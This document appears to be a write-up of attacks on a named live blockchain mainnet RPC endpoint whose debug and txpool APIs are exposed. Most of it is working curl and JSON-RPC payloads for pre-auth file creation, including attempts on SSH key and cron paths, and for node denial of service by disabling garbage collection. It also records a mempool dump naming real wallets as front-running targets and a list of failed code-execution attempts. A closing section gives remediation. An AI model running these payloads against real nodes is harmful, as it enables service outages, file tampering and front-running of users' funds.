# U2U Network Mainnet Debug API Exposure — 2026-08 Case Study

## Scope
- Live RPC: `https://rpc-mainnet.uniultra.xyz` (chain ID 39 / 0x27, block ~66M, `go-u2u/v1.1.3-stable`)
- Repo: `github.com/unicornultrafoundation/go-u2u` (Fantom/go-opera descendant, aBFT consensus)

## Entry Point
`rpc_modules` → `{"debug":"1.0","eth":"1.0","net":"1.0","rpc":"1.0","txpool":"1.0","web3":"1.0"}` — full debug + txpool namespaces on the PUBLIC endpoint, zero auth, CORS `*`.

## Confirmed Live Findings (all verified with curl, 2026-08-13)

### 1. Pre-auth arbitrary file write (pprof profile drop)
All return `{"result":null}` = success:
```bash
curl -X POST https://rpc-mainnet.uniultra.xyz -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile","params":["/tmp/pwned"],"id":1}'
curl -X POST ... -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile","params":["/proc/self/environ"],"id":1}'  # SUCCESS
curl -X POST ... -d '{"jsonrpc":"2.0","method":"debug_writeBlockProfile","params":["/tmp/x"],"id":1}'
curl -X POST ... -d '{"jsonrpc":"2.0","method":"debug_goTrace","params":["/tmp/x",1],"id":1}'
curl -X POST ... -d '{"jsonrpc":"2.0","method":"debug_mutexProfile","params":["/tmp/x",1],"id":1}'
```
- Source: `internal/debug/api.go` `writeProfile()` → `os.Create(expandHome(file))`; `expandHome` expands `~/` only, NO allowlist.
- `/etc/cron.d/<REDACTED-PERSONA-NAME>` and `/root/.ssh/authorized_keys` FAILED with `no such file or directory` (parent dirs didn't exist in container) — error message = path-existence oracle.
- Constraint: content is binary pprof, not attacker-controlled → DoS + arbitrary file create/truncate, NOT RCE by itself. Report honestly.

### 2. Node DoS primitives (all executed successfully)
```json
{"method":"debug_setGCPercent","params":[100000]}   → returned 100 (previous value)
{"method":"debug_setGCPercent","params":[-1]}      → disables GC entirely → OOM
{"method":"debug_freeOSMemory","params":[]}        → forced GC, repeatable for thrashing
{"method":"debug_verbosity","params":[6]}          → log flood
```

### 3. txpool_content — full mempool dump (MEV feed)
152 queued txs from 68 addresses at time of probe. High-value samples:
- 5000 U2U → 0x70036592459e7e721b3f603d95dea17a00de0e7a
- 1000 U2U self-send from whale 0xDe2C869ACE2940B4bE870203434DC6403f6246e2
Full from/to/value/nonce/gasPrice per tx. Front-running + whale tracking.

### 4. debug_stacks / debug_memStats / debug_gcStats — internal state oracle
- `debug_stacks`: 6200+ line goroutine dump, leaks `/go/go-u2u` source paths, pebble DB version, handler internals.
- `debug_memStats`: 1.6GB HeapAlloc, 3.7GB Sys, 963TB TotalAlloc, 1.18M GC cycles — node health/capacity intel for timing DoS.

### 5. debug_traceCall with prestateTracer — storage oracle for any contract
```json
{"method":"debug_traceCall","params":[{"to":"0xfc00face00000000000000000000000000000000","data":"0x09dc5d1a..."},"latest",{"tracer":"prestateTracer","tracerConfig":{"diffMode":false}}]}
```
Returned SFC proxy storage: slot 0x80 → implementation `0xfc01face0000...` (SFCLib, 20KB code). Working tracers: callTracer, prestateTracer, 4byteTracer, noopTracer, bigramTracer, trigramTracer, unigramTracer.

## Killed Theories (do not retry)
- **JS custom tracer RCE**: `{"tracer":"{step:function(){...}}"}` → `tracer not found`. goja tracer registry only resolves names from embedded asset map (`eth/tracers/js/internal/tracers`), not arbitrary code. No `require("fs")` in goja regardless.
- **debug_setHead**: `helios cannot rewind blocks due to the BFT algorithm` — aBFT finality kills chain-rewind.
- **admin_*, personal_*, miner_***: not in `--http.api` module list → `-32601 not available`.
- **trace_***: namespace registered in backend.go but not enabled on this endpoint.

## Where the Misconfig Came From
`go-u2u/integrationtests/integration_test_net.go:115` ships `--http.api admin,eth,web3,net,txpool,trace,debug,sfc` — the test-net flag set leaked into mainnet node deployment.

## Remediation
Remove `debug` and `txpool` from public `--http.api`; bind debug to localhost or IPC only. If debug needed remotely, gate behind API key + IP allowlist.
